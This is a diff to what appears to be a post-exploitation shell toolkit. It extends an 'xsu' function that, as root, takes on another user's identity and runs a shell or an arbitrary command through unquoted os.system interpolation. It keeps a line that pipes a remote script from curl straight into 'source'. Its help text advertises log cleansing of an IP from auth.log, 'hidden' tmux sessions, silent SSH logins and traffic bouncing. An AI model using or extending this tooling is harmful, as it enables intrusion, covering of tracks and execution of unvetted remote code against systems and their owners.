@@ -121,18 +121,20 @@ xsu() {
     local name="${1:?}"
     local u g h
     local bak
+    local pcmd="os.execlp('bash', 'bash')"
 
+    shift 1
+    [ $# -gt 0 ] && pcmd="os.system('$*')"
     [ "$UID" -ne 0 ] && { HS_ERR "Need root"; return; }
     u=$(id -u "${name:?}") || return
     g=$(id -g "${name:?}") || return
     h="$(grep "^${name}:" /etc/passwd | cut -d: -f6)"
-    # echo "HOME=${h:-/tmp}"
     # Not all systems support unset -n
     # unset -n _HS_HOME_ORIG
-    echo -e "May need to cut & paste: ' ${CDC}source <(curl -SsfL ${_HSURL})${CN}'"
+    echo >&2 -e "May need to cut & paste: ' ${CDC}source <(curl -SsfL ${_HSURL})${CN}'"
     bak="$_HS_HOME_ORIG"
     unset _HS_HOME_ORIG
-    LOGNAME="${name}" USER="${name}" HOME="${h:-/tmp}" "${HS_PY:-python}" -c "import os;os.setgid(${g:?});os.setuid(${u:?});os.execlp('bash', 'bash')"
+    LOGNAME="${name}" USER="${name}" HOME="${h:-/tmp}" "${HS_PY:-python}" -c "import os;os.setgid(${g:?});os.setuid(${u:?});${pcmd}"
     export _HS_HOME_ORIG="$bak"
 }
 
@@ -1689,7 +1691,7 @@ xhelp() {
 
     echo -en "\
 ${CDC} xlog '1\.2\.3\.4' /var/log/auth.log   ${CDM}Cleanse log file
-${CDC} xsu username                          ${CDM}Switch user
+${CDC} xsu username <cmd>                    ${CDM}Switch user ${CN}${CF}[xsu user id -u]
 ${CDC} xtmux                                 ${CDM}'hidden' tmux ${CN}${CF}[e.g. wont show with 'tmux list-s']
 ${CDC} xssh & xscp                           ${CDM}Silently log in to remote host
 ${CDC} bounce <port> <dst-ip> <dst-port>     ${CDM}Bounce tcp traffic to destination ${CN}${CF}[xhelp bounce]
